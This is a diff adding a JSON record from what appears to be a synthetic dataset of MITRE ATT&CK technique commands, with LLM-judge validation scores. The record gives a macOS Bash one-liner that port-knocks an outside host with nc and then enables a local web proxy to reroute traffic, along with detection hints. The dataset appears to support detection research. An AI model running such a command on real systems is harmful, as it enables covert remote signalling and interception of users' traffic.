@@ -1,0 +1,48 @@
+{
+  "technique_id": "T1205",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "for p in 45001 45002 45003; do echo -n KO | nc -u -w1 203.0.113.10 \"$p\"; sleep 1; done && networksetup -setwebproxy \"Wi-Fi\" 127.0.0.1 8080 && networksetup -setwebproxystate \"Wi-Fi\" on",
+  "explanation": "Performs a UDP port-knocking sequence with a small payload to trigger a remote action, then enables an HTTP proxy on localhost. Detection: monitor repeated UDP packets to uncommon high ports and unauthorized changes to web proxy settings.",
+  "rationale_steps": [
+    "Transmit UDP packets to a predefined knock sequence of ports to 203.0.113.10.",
+    "The sequence acts as a covert signal to a remote listener to enable access or a service.",
+    "Set and enable the Wi-Fi HTTP proxy to route traffic through a local handler after the signal.",
+    "Detect by inspecting flows for sequential UDP probes to high ports and tracking sudden proxy configuration changes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-d65eb033-cdb7e53d",
+  "source_prompt_hash": "d65eb033",
+  "timestamp_utc": "2025-09-30T06:10:08.592373Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash loop with balanced quoting and valid nc and networksetup options, properly separated and chained.",
+        "semantic_score": 4,
+        "semantic_justification": "It implements traffic signaling via UDP port-knocking and then enables a local HTTP proxy on macOS, but the proxy change typically requires root privileges so 'Privilege: None' may fail despite the approach aligning with T1205.",
+        "combined_score": 4.5,
+        "confidence": 0.87,
+        "timestamp": "2025-10-01T14:35:27.827601Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct Bash loop syntax, valid netcat flags, proper command separators, and correctly quoted arguments for networksetup.",
+        "semantic_score": 3,
+        "semantic_justification": "The initial UDP port-knocking sequence perfectly aligns with T1205 Traffic Signaling, but the subsequent networksetup commands to enable a web proxy require root privileges on macOS, making them semantically correct in intent but operationally implausible under the stated 'None' privilege level.",
+        "combined_score": 4.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T14:36:13.705404Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.5,
+    "llm_average_score": 4.25,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
